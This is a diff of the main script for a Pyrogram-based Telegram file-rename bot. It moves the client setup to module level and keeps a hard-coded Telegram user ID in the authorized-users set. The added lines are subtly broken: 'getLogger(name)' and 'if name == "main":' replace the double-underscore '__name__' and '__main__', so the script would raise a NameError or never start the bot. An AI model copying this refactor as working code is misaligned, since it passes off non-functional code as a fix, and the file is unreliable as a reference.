@@ -1,31 +1,38 @@
 import logging
+import os
+import pyrogram
+
+# Logging setup
 logging.basicConfig(level=logging.DEBUG,
                     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
-logger = logging.getLogger(__name__)
+logger = logging.getLogger(name)
 logging.getLogger("pyrogram").setLevel(logging.WARNING)
-import os
 
+# Config import
 if bool(os.environ.get("WEBHOOK", False)):
     from sample_config import Config
 else:
     from config import Config
 
-import pyrogram
+# Ensure download location exists
+Config.DOWNLOAD_LOCATION = Config.DOWNLOAD_LOCATION or "/tmp/DOWNLOADS"
+os.makedirs(Config.DOWNLOAD_LOCATION, exist_ok=True)
 
+# Plugins
+plugins = dict(root="plugins")
 
+# Pyrogram client
+app = pyrogram.Client(
+    "RenameBot",
+    bot_token=Config.TG_BOT_TOKEN,
+    api_id=Config.APP_ID,
+    api_hash=Config.API_HASH,
+    plugins=plugins
+)
 
-if __name__ == "__main__" :
-    if not os.path.isdir(Config.DOWNLOAD_LOCATION):
-        os.makedirs(Config.DOWNLOAD_LOCATION)
-    plugins = dict(
-        root="plugins"
-    )
-    app = pyrogram.Client(
-        "RenameBot",
-        bot_token=Config.TG_BOT_TOKEN,
-        api_id=Config.APP_ID,
-        api_hash=Config.API_HASH,
-        plugins=plugins
-    )
-    Config.AUTH_USERS.add(861055237)
+# Add manual authorized user
+Config.AUTH_USERS.add(861055237)
+
+# Run bot
+if name == "main":
     app.run()
